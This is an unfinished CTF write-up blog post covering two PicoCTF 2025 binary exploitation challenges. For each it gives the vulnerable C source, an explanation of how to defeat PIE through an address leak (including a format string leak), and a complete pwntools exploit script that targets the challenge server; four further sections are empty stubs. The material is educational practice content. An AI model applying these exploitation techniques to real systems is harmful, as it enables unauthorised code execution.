---
title: PicoCTF 2025 Binary Exploitation
description: Writeups for PicoCTF 2025 binary exploitation challenges
date: 2025-10-09 14:00:00 -0700
categories: [CTF]
math: true
tags: [PicoCTF, Binary Exploitation, Writeup]
published: false
---


> This page is under construction
{: .prompt-warning }

## **Pie Time**
---
### Overview
- **Category**: Other 
- **Difficulty**: Easy (2/10)
- **Challenge Files**: `vuln.c`, `vuln`
- **Source Code**: 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

### Exploitation Steps
#### Analysis
The program gives you the address of `main`. This is enough info for finding the base address. If we know the base address, we can find the address of `win`.

#### Find the offset of `main` and `win`
You can either use pwntools:

```python
addr_main = elf.sym["main"]
addr_win  = elf.sym["win"]
```

Or use `nm` and `grep`:

```bash
nm vuln | grep -E " main|win"
```

#### Calculate the base address
The equation of calculating base address is:
$$
\begin{equation}
  base = address - offset
\end{equation}
$$

Just subtract the offset of `main` from the address of `main` it have provided, you get the base address.

By adding the offset of `win` to base address, you get the address of `win`.

$$
\begin{equation}
  address = base + offset
\end{equation}
$$

#### Send the address of `win` 
A good thing about pwntools is if you set the base address of ELF, you don't have to manually add the numbers. 

Instead of:
```python
base = addr_main - offset_main
addr_win = base + offset_win
```

You could do:
```python
elf.address = addr_main - elf.sym["main"]
```
Now `elf.sym["win"]` is the actual address of `win` instead of its offset.

Finally, turn the address of `win`, which is in integer form, into hexadecimal literal and send to the program.


### Solution
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""

def conn():
    if args.REMOTE:
        r = remote("rescued-float.picoctf.net", 54073)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()

    r.recvuntil(b'Address of main: ')

    # turn string into int
    addr_main = int(r.recvuntilS(b'\n', drop=True), 16)

    # calculate the base address
    elf.address = addr_main - elf.sym["main"]

    # turn address of win into hexadecimal literal
    payload = hex(elf.sym["win"])

    # send the payload
    r.sendlineafter(b'Enter the address to jump to, ex => 0x12345: ', payload)

    # throw away the garbage
    r.recvuntil(b'You won!\n')

    # get the flag
    flag = r.recvuntil(b'\n', drop=True).decode("ascii")

    print()
    print(flag)
    print()


if __name__ == "__main__":
    main()
```

<br>
<br>

## **Pie Time 2**
---
### Overview
- **Category**: Format string bug 
- **Difficulty**: Easy (2/10)
- **Challenge Files**: `vuln.c`, `vuln`
- **Source Code**: 

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

### Exploitation Steps
#### Analysis
Second challenge is a bit harder. Instead of giving you the address directly, it gives you a format string vulnerability.
You can use this vulnerability to leak the return address of `call_function` or any address in the elf binary.
After you using the leaked address to get the base address, everything else will be the same.

#### Leak the return address
No matter how the address of elf binary changes, its last 3 hex digits will never change. You can use this idea to find the format index.

Run the program in `gdb` and break into `call_functions`, you can find out where this function will return to `main+65`, and the address ends with `441`. 
By spamming input `%p %p %p ...` and count until a hexadecimal number end with `441`, you will find the format index of return address is 19.
Now you can just use `%19$p` to get the return address.

#### Calculate the address of win and send it
After you leak the return address, subtract the offset main+65 to get the base address. The rest is exactly like the previous challenge.
### Solution
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")

context.binary = elf
context.terminal = ["alacritty", "-e", "sh", "-c"]
dbginit = """
b main
"""

def conn():
    if args.REMOTE:
        r = remote("rescued-float.picoctf.net", 61919)
    elif args.GDB:
        r = gdb.debug([elf.path], gdbscript=dbginit)
    else:
        r = process([elf.path])
    return r


def main():
    r = conn()
    
    # leak the return address
    r.sendlineafter(b'Enter your name:', b'%19$p|')
    leak = int(r.recvuntil(b'|',drop=True).decode("ascii"), 16)

    # calculate the base address
    elf.address = leak - (elf.sym["main"] + 65)

    payload = hex(elf.sym["win"])

    r.sendlineafter(b' enter the address to jump to, ex => 0x12345: ', payload)

    r.recvuntil(b'You won!\n')

    flag = r.recvuntil(b'\n', drop=True).decode("ascii")

    print()
    print(flag)
    print()


if __name__ == "__main__":
    main()
```
<br>
<br>

## **Hash Only 1**
---
### Overview
- **Category**: 
- **Difficulty**: 
- **Challenge Files**: 
- **Source Code**: 

### Exploitation Steps
### Solution
```python
```
<br>
<br>

## **Hash Only 2**
---
### Overview
- **Category**: 
- **Difficulty**: 
- **Challenge Files**: 
- **Source Code**: 

### Exploitation Steps
### Solution
```python
```
<br>
<br>

## **Echo Valley**
---
### Overview
- **Category**: 
- **Difficulty**: 
- **Challenge Files**: 
- **Source Code**: 

### Exploitation Steps
### Solution
```python
```
<br>
<br>

## **Handoff**
---
### Overview
- **Category**: 
- **Difficulty**: 
- **Challenge Files**: 
- **Source Code**: 

### Exploitation Steps
### Solution
```python
```
<br>
<br>
